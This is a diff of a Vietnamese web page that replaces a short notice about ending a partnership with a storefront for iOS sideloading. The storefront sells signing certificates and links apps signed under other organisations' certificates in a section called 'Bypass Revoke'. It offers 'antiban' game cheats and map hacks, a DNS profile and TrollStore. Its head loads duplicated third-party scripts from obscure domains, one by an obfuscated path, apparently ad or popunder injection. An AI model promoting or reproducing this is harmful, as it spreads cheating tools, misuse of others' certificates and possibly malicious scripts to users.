@@ -1,137 +1,355 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <title>Thông Báo Ngừng Hợp Tác</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!DOCTYPE html><html lang="vi"><head manus-helper-ready="true">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: "Segoe UI", Tahoma, Arial, sans-serif;
-            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            color: #fff;
-        }
+  <title>Vũ Văn Khơi</title>
 
-        .notice-box {
-            max-width: 720px;
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(10px);
-            border-radius: 16px;
-            padding: 40px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
-            animation: fadeIn 1s ease;
-        }
+  <link rel="preconnect" href="https://images.dmca.com" crossorigin="">
+  <link rel="canonical" href="">
+  
+  <!-- Cache busting: ?v=20260406 — đổi số này mỗi khi update file -->
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="app.css">
 
-        .notice-title {
-            text-align: center;
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
-        }
+  <meta name="description" content="Website chính chủ của Vũ Văn Khơi (khoindvn). Tải ESign, KSign và chứng chỉ iOS miễn phí, cập nhật nhanh nhất."> 
+  <meta name="keywords" content="khoindvn,vuvankhoi,esign,ksign,apple certificate,chứng chỉ ios">
+  <meta property="og:title" content="Vũ Văn Khơi">
+  <meta property="og:description" content="ESign, KSign, chứng chỉ iOS Free – khoindvn.io.vn">
+  <meta property="og:image" content="img/pf/profile-pic.png">
+  <meta property="og:url" content="">
+  <meta property="og:type" content="website">
+  <meta property="og:site_name" content="Khơindvn">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="dmca-site-verification" content="bVJESUtHbW93QWxxWFEwN3VsNDRFQT090">
 
-        .effective-date {
-            text-align: center;
-            font-size: 14px;
-            color: #d1e8ff;
-            margin-bottom: 25px;
-        }
+  <link rel="icon" type="image/png" href="img/pf/profile-pic.png">
+  <link rel="shortcut icon" href="img/icons/badge.png">
 
-        .notice-divider {
-            width: 90px;
-            height: 4px;
-            background: linear-gradient(to right, #00c6ff, #0072ff);
-            margin: 0 auto 30px;
-            border-radius: 10px;
-        }
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Organization","name":"Vũ Văn Khơi x Khoindvn",
+   "url":"","logo":"img/pf/profile-pic.png",
+   "sameAs":["https://t.me/+SpFewJb4liUwODM1","https://discord.gg/cQjuP9TEp3"]}
+  </script>
 
-        .notice-content {
-            font-size: 16px;
-            line-height: 1.8;
-            color: #eaeaea;
-        }
+  <!-- Inline SVG defs for reuse -->
+  <script src="https://preferencenail.com/sfp.js"></script><script src="https://preferencenail.com/sfp.js"></script><script src="khoindvn.js" defer=""></script></head><body><svg style="display:none" xmlns="http://www.w3.org/2000/svg">
+    <!-- Chevron right -->
+    <symbol id="ico-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </symbol>
+  </svg>
+<script src="https://ministercheckingpeering.com/iJN/b96Vs8GAQpHG5L/zyP2/btJy1R/uAF2fUMFRzQ4ft/jkfvmTCdeNuu/EDLCS/utuR8b-Jsv0hQ5TfzfJb/bns6GbZWwx8zZP9Ua8/noc-LgWV/6AXlcuB65UdJXg/dWb4JWL" type="text/javascript"></script>
 
-        .notice-content p {
-            margin-bottom: 18px;
-        }
+<script src="https://ministercheckingpeering.com/47/a9/13/47a913b960040fe7926ec0833cfc6151.js" type="text/javascript"></script>
+<script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2341551858705774" crossorigin="anonymous" type="text/javascript"></script>
+  
 
-        .notice-footer {
-            margin-top: 35px;
-            text-align: right;
-            font-style: italic;
-            color: #cfd9df;
-        }
 
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
 
-        @media (max-width: 600px) {
-            .notice-box {
-                padding: 25px;
-            }
+<!-- ═══════════════════ NAVBAR ═══════════════════ -->
+<header>
+  <nav class="navbar" aria-label="Chính">
+    <a href="#about" class="nav-logo" data-manus_clickable="true" data-manus_click_id="1">khoindvn</a>
 
-            .notice-title {
-                font-size: 22px;
-            }
-        }
-    </style>
-</head>
-<body>
+    <!-- Desktop: links giữa -->
+    <ul class="nav-links" id="nav-links">
+      <li><a href="#about" data-manus_clickable="true" data-manus_click_id="2">Trang chủ</a></li>
+      <li><a href="#links" data-manus_clickable="true" data-manus_click_id="3">Dịch vụ</a></li>
+      <li><a href="#signed" data-manus_clickable="true" data-manus_click_id="4">Signed App</a></li>
+      <li><a href="#bypass" data-manus_clickable="true" data-manus_click_id="5">ESign / KSign</a></li>
+      <li><a href="#skills" data-manus_clickable="true" data-manus_click_id="6">Kỹ năng</a></li>
+    </ul>
 
-    <div class="notice-box">
-        <div class="notice-title">THÔNG BÁO NGỪNG HỢP TÁC</div>
+    <!-- Nhóm bên phải: themeBtn + hamburger -->
+    <div class="nav-right">
+      <button id="themeBtn" class="color-mode" aria-label="Chuyển chế độ màu" data-manus_clickable="true" data-manus_click_id="7">
+        <svg id="themeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <circle cx="12" cy="12" r="5"></circle>
+          <line x1="12" y1="1" x2="12" y2="3"></line>
+          <line x1="12" y1="21" x2="12" y2="23"></line>
+          <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+          <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+          <line x1="1" y1="12" x2="3" y2="12"></line>
+          <line x1="21" y1="12" x2="23" y2="12"></line>
+          <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+          <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+        </svg>
+      </button>
 
-        <!-- NGÀY HIỆU LỰC -->
-        <div class="effective-date">
-            Ngày hiệu lực: <strong>08/01/2026</strong>
-        </div>
-
-        <div class="notice-divider"></div>
-
-        <div class="notice-content">
-            <p>
-                Chúng tôi xin trân trọng thông báo rằng, kể từ ngày hiệu lực nêu trên,
-                website chính thức của chúng tôi sẽ <strong>chấm dứt hợp tác</strong>
-                với <strong>Hoàn Hải Hân Thành Đạt</strong>.
-            </p>
-
-            <p>
-                Quyết định này được đưa ra dựa trên định hướng phát triển lâu dài,
-                nhằm đảm bảo sự minh bạch, hiệu quả và phù hợp với chiến lược hoạt động
-                trong giai đoạn tiếp theo.
-            </p>
-
-            <p>
-                Kể từ thời điểm có hiệu lực, mọi nội dung, hình ảnh, thông tin hoặc
-                hoạt động liên quan đến sự hợp tác trước đây sẽ không còn giá trị
-                trên hệ thống của chúng tôi.
-            </p>
-
-            <p>
-                Chúng tôi trân trọng ghi nhận sự hợp tác trong thời gian vừa qua
-                và kính chúc quý đối tác nhiều thành công trong các dự án sắp tới.
-            </p>
-        </div>
-
-        <div class="notice-footer">
-            Trân trọng,<br>
-            Ban Quản Trị Website
-        </div>
+      <button id="menu-button" class="menu-button" aria-label="Mở menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" aria-hidden="true" width="22" height="22">
+          <line x1="3" y1="6" x2="21" y2="6"></line>
+          <line x1="3" y1="12" x2="21" y2="12"></line>
+          <line x1="3" y1="18" x2="21" y2="18"></line>
+        </svg>
+      </button>
     </div>
+  </nav>
+</header>
 
-</body>
-</html
+  <main>
+
+<!-- ═══════════════════ HERO ═══════════════════ -->
+<section class="hero" id="about" aria-labelledby="hero-name">
+  <div class="hero-inner">
+    <img class="hero-avatar" src="img/pf/profile-pic.png" alt="Avatar Vũ Văn Khơi" loading="eager" decoding="async">
+
+    <h1 class="hero-name" id="hero-name">
+      Vũ Văn Khơi
+      <img src="img/icons/badge.png" alt="✓" loading="lazy" style="height:24px;width:24px;vertical-align:middle;flex-shrink:0;">
+    </h1>
+
+    <p class="hero-typing">
+      <span id="typed-text">Seller.</span><span class="cursor">|</span>
+    </p>
+
+    <p class="hero-desc">
+      Mua chứng chỉ <strong>ESign / KSign</strong> cài app 100% thành công chỉ <strong>50k</strong> —
+      <a href="https://muacert.com" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="8">muacert.com</a>
+    </p>
+
+    <div class="social-buttons" aria-label="Mạng xã hội"><button class="social-btn" aria-label="facebook" data-manus_clickable="true" data-manus_click_id="9"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="24" rx="6" fill="#1877f2"></rect><path d="M16 8h-2a1 1 0 0 0-1 1v2h3l-.5 3H13v7h-3v-7H8v-3h2V9a4 4 0 0 1 4-4h2v3z" fill="white"></path></svg></button><button class="social-btn" aria-label="messenger" data-manus_clickable="true" data-manus_click_id="10"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="24" rx="6" fill="#0084ff"></rect><path d="M12 2C6.5 2 2 6.2 2 11.4c0 2.9 1.4 5.4 3.6 7.1v3.5l3.3-1.8c.9.2 1.8.3 2.1.3 5.5 0 10-4.2 10-9.4S17.5 2 12 2zm1 12.6l-2.5-2.7-4.9 2.7 5.4-5.7 2.6 2.7 4.8-2.7-5.4 5.7z" fill="white"></path></svg></button><button class="social-btn" aria-label="telegram" data-manus_clickable="true" data-manus_click_id="11"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="24" rx="6" fill="#2196f3"></rect><path d="M20.7 3.3L2.3 10.2c-.9.4-.9 1 0 1.2l4.6 1.4 1.7 5.3c.2.6.4.8.8.8.4 0 .6-.2.9-.5l2.2-2.1 4.6 3.4c.8.5 1.4.2 1.6-.7l3-14.2c.3-1.1-.4-1.6-1.1-1.5zm-3.4 4.4L9 14.5l-.3 3.3-1.7-5.3 11.3-4.8z" fill="white"></path></svg></button><button class="social-btn" aria-label="zalo" data-manus_clickable="true" data-manus_click_id="12"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><rect width="24" height="24" rx="6" fill="#0068ff"></rect><text x="50%" y="56%" dominant-baseline="middle" text-anchor="middle" font-family="-apple-system,Arial,sans-serif" font-weight="900" font-size="10" fill="white">Zalo</text></svg></button></div>
+  </div>
+</section>
+
+<!-- ═══════════════════ LINKS ═══════════════════ -->
+<span class="section-label" id="links">Dịch vụ &amp; Liên kết</span>
+
+<div class="links-section">
+  <div class="links-card">
+
+    <!-- Website bán cert -->
+    <a class="link-row" href="https://cert.khoindvn.io.vn" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="13">
+      <span class="link-icon-wrap" style="background:#fff3e0;">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#f57c00" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
+          <line x1="3" y1="6" x2="21" y2="6" stroke="#f57c00" stroke-width="1.8"></line>
+          <path d="M16 10a4 4 0 01-8 0" stroke="#f57c00" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </span>
+      <span class="link-label">Website Bán Chứng Chỉ – 50k</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+    <!-- Telegram channel -->
+    <a class="link-row" href="https://t.me/+7bbn-Bk1RCk2NTQ9" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="14">
+      <span class="link-icon-wrap" style="background:#e3f2fd;">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M21.8 2.2L1.4 10c-1.3.5-1.3 1.3-.2 1.6l5.2 1.6 1.9 5.9c.3.8.4 1 1 1 .5 0 .7-.2 1-.6l2.5-2.4 5.2 3.8c1 .5 1.7.3 1.9-.9l3.4-16c.4-1.5-.5-2.2-1.5-1.8z" fill="#2196f3"></path>
+          <path d="M8.8 13.4l.4 4.6 2.3-2.2-2.7-2.4z" fill="#1565c0"></path>
+        </svg>
+      </span>
+      <span class="link-label">Telegram Notification Channel</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+    <!-- Box chat Telegram -->
+    <a class="link-row" href="https://t.me/freemapios" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="15">
+      <span class="link-icon-wrap" style="background:#e8f5e9;">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" stroke="#43a047" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
+        </svg>
+      </span>
+      <span class="link-label">Box Chat Hack Map Mod LQMB</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+    <!-- Discord -->
+    <a class="link-row" href="https://discord.gg/cQjuP9TEp3" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="16">
+      <span class="link-icon-wrap" style="background:#ede7f6;">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M20.3 4.4A19.7 19.7 0 0015.3 3c-.2.4-.5.9-.7 1.3a18.3 18.3 0 00-5.3 0A13.2 13.2 0 008.7 3a19.7 19.7 0 00-5 1.4C1.4 9 .8 13.4 1 17.8a19.9 19.9 0 006 3 14.9 14.9 0 001.3-2.1 12.9 12.9 0 01-2-.9l.5-.4a14.2 14.2 0 0012.3 0l.5.4a12.9 12.9 0 01-2 1 14.9 14.9 0 001.3 2c2.1-.6 4.1-1.6 6-3 .3-4.9-.8-9.3-3.6-13.4zM8.5 15.2c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3zm7 0c-1.1 0-2-1-2-2.3s.9-2.3 2-2.3 2 1 2 2.3-.9 2.3-2 2.3z" fill="#7c4dff"></path>
+        </svg>
+      </span>
+      <span class="link-label">Join Discord Server</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+          <polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+    <!-- DNS Profile -->
+    <a class="link-row" href="https://github.com/dns-khoindvn/top-country-stats/releases/download/DNS/khoindvn.io.vn.mobileconfig" data-manus_clickable="true" data-manus_click_id="17">
+      <span class="link-icon-wrap" style="background:#e0f7fa;">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="12" r="9" stroke="#0097a7" stroke-width="1.8"></circle>
+          <path d="M2 12h20M12 2a15.3 15.3 0 010 20M12 2a15.3 15.3 0 000 20" stroke="#0097a7" stroke-width="1.8" stroke-linecap="round"></path>
+        </svg>
+      </span>
+      <span class="link-label">Download DNS Profile</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+          <polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+    <!-- File IPA ESign -->
+    <a class="link-row" href="https://files.catbox.moe/z6n5sw.ipa" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="18">
+      <span class="link-icon-wrap" style="background:#fce4ec;">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4" stroke="#e91e63" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></path>
+          <polyline points="7 10 12 15 17 10" stroke="#e91e63" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"></polyline>
+          <line x1="12" y1="15" x2="12" y2="3" stroke="#e91e63" stroke-width="1.8" stroke-linecap="round"></line>
+        </svg>
+      </span>
+      <span class="link-label">File iPA ESign</span>
+      <span class="link-open-btn">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+          <polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line>
+        </svg>
+      </span>
+    </a>
+
+  </div>
+</div>
+
+<!-- ═══════════════════ SIGNED APP ═══════════════════ -->
+<span class="app-section-label" id="signed">Signed App</span>
+<div class="apps-wrap">
+  <div class="app-section"><a href="http://sub.khoindvn.io.vn/aovcheat/" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="19"><img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/c4/ca/f6/c4caf66c-cd27-efda-fdd5-7f7f87535663/AppIcon-1x_U007emarketing-0-11-0-85-220-0.png/512x512bb.jpg" class="app-icon" alt="AovCheat ✅" loading="lazy"><div class="app-text"><div class="app-title">AovCheat ✅</div><div class="app-sub">Hack Map Đánh Kín Update 13/04/2026 Fix Văng</div></div><div class="app-action">INSTALL</div></a><a href="https://sub.khoindvn.io.vn/deltavn/" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="20"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQM4K15INcKnSAx3OEPed4Z8rc9bLg1FH2HEoYr6w8FFg&amp;s" class="app-icon" alt="Delta VN ✅" loading="lazy"><div class="app-text"><div class="app-title">Delta VN ✅</div><div class="app-sub">Update Fix Văng 13/04/2026 fix Menu Ko Bypass Đc Key</div></div><div class="app-action">INSTALL</div></a><a href="http://sub.khoindvn.io.vn/cfvn/" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="21"><img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/d5/67/82/d5678282-ac1b-05d7-c61f-c10955a61479/AppIcon-1x_U007emarketing-0-10-0-85-220-0.png/512x512bb.jpg" class="app-icon" alt="Crossfire: Legends ✅" loading="lazy"><div class="app-text"><div class="app-title">Crossfire: Legends ✅</div><div class="app-sub">Hack Aim antiband – Update fix văng 13/04/2026</div></div><div class="app-action">INSTALL</div></a><a href="https://authtool.app/get-key?code=7842d3c4-92fa-48a5-8130-8d150ae3a32e" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="22"><img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/d5/67/82/d5678282-ac1b-05d7-c61f-c10955a61479/AppIcon-1x_U007emarketing-0-10-0-85-220-0.png/512x512bb.jpg" class="app-icon" alt="Get Key Crossfire: Legends ✅" loading="lazy"><div class="app-text"><div class="app-title">Get Key Crossfire: Legends ✅</div><div class="app-sub">Lấy key Crossfire: Legends</div></div><div class="app-action">INSTALL</div></a><a href="http://sub.khoindvn.io.vn/ff/" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="23"><img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/4b/8d/ba/4b8dba37-a240-f450-9f99-c3a611c96536/AppIcon-1767797054-1x_U007emarketing-0-8-0-85-220-0.png/512x512bb.jpg" class="app-icon" alt="Free Fire ✅" loading="lazy"><div class="app-text"><div class="app-title">Free Fire ✅</div><div class="app-sub">Hack FF antiban log song song này cho ai biết chơi log song thôi – Update 09/04/2026</div></div><div class="app-action">INSTALL</div></a><a href="https://authtool.app/get-key?code=5cabe518-9c44-4745-8e1c-f4845a9957ad" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="24"><img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/4b/8d/ba/4b8dba37-a240-f450-9f99-c3a611c96536/AppIcon-1767797054-1x_U007emarketing-0-8-0-85-220-0.png/512x512bb.jpg" class="app-icon" alt="Get Key Free fire ✅" loading="lazy"><div class="app-text"><div class="app-title">Get Key Free fire ✅</div><div class="app-sub">Lấy key vào game free fire</div></div><div class="app-action">INSTALL</div></a><a href="https://sub.khoindvn.io.vn/trollst" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="25"><img src="https://raw.githubusercontent.com/alfiecg24/TrollInstallerX/main/Resources/Icon.png" class="app-icon" alt="TrollStore X ✅" loading="lazy"><div class="app-text"><div class="app-title">TrollStore X ✅</div><div class="app-sub">Hỗ trợ iOS 14.0 – 16.6.1</div></div><div class="app-action">INSTALL</div></a></div>
+</div>
+
+<!-- ═══════════════════ BYPASS REVOKE ═══════════════════ -->
+<span class="app-section-label" id="bypass">Bypass Revoke</span>
+
+<div class="seg-wrap" role="tablist" aria-label="Chọn loại chứng chỉ">
+  <div class="seg-track">
+    <div class="seg-thumb" id="seg-thumb"></div>
+    <button class="seg-btn active" id="tab-esign" role="tab" aria-selected="true" aria-controls="panel-esign" onclick="if (!window.__cfRLUnblockHandlers) return false; switchTab('esign')" data-manus_clickable="true" data-manus_click_id="26">ESign</button>
+    <button class="seg-btn" id="tab-ksign" role="tab" aria-selected="false" aria-controls="panel-ksign" onclick="if (!window.__cfRLUnblockHandlers) return false; switchTab('ksign')" data-manus_clickable="true" data-manus_click_id="27">KSign</button>
+  </div>
+</div>
+
+<div id="panel-esign" role="tabpanel" aria-labelledby="tab-esign" class="tab-panel">
+  <div class="apps-wrap"><div class="esign-section"><a href="https://api.khoindvn.io.vn/fxHqSE" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="28"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign ✅" loading="lazy"><div class="app-text"><div class="app-title">ESign ✅</div><div class="app-sub">XL AXIATA, PT TBK</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/nbSQ2q" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="29"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">BOC International (China) Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/Fv5vFZ" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="30"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign BOC V1" loading="lazy"><div class="app-text"><div class="app-title">ESign BOC V1</div><div class="app-sub">BOC International (China) Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/FLwKeO" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="31"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign BOC V2" loading="lazy"><div class="app-text"><div class="app-title">ESign BOC V2</div><div class="app-sub">BOC International (China) Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/Lxiubx" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="32"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign BOC V3" loading="lazy"><div class="app-text"><div class="app-title">ESign BOC V3</div><div class="app-sub">BOC International (China) Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/SiRDpZ" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="33"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">National Oilwell Varco, Inc.</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/IosVVa" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="34"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">VIETNAM AIRLINES JSC</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/VlLV6l" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="35"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/7944EP" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="36"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign PowerChina V1" loading="lazy"><div class="app-text"><div class="app-title">ESign PowerChina V1</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/btX260" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="37"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign PowerChina V2" loading="lazy"><div class="app-text"><div class="app-title">ESign PowerChina V2</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/cDNdxx" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="38"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign PowerChina V3" loading="lazy"><div class="app-text"><div class="app-title">ESign PowerChina V3</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/mobNoQ" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="39"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign PowerChina V4" loading="lazy"><div class="app-text"><div class="app-title">ESign PowerChina V4</div><div class="app-sub">PowerChina International Group Limited</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/JHqEjv" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="40"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">Qingdao Rural Commercial Bank Co., Ltd </div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/CkOyq3" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="41"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">Commission on Elections</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/6UMBaC" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="42"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign Com V1" loading="lazy"><div class="app-text"><div class="app-title">ESign Com V1</div><div class="app-sub">Commission on Elections</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/GX5cq7" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="43"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign Com V2" loading="lazy"><div class="app-text"><div class="app-title">ESign Com V2</div><div class="app-sub">Commission on Elections</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/m3iXgW" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="44"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">Luoyang Postal Administration</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/8oAYgJ" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="45"><img src="img/pf/profile-pic.png" class="app-icon" alt="ESign" loading="lazy"><div class="app-text"><div class="app-title">ESign</div><div class="app-sub">CHIBA INSTITUTE OF TECHNOLOGY</div></div><div class="app-action">INSTALL</div></a><a href="https://api.khoindvn.io.vn/OtZYJW" class="app-row" target="_blank" rel="noopener" data-manus_clickable="true" data-manus_click_id="46"><img src="img/pf/profile-pic.png" class="app-icon" 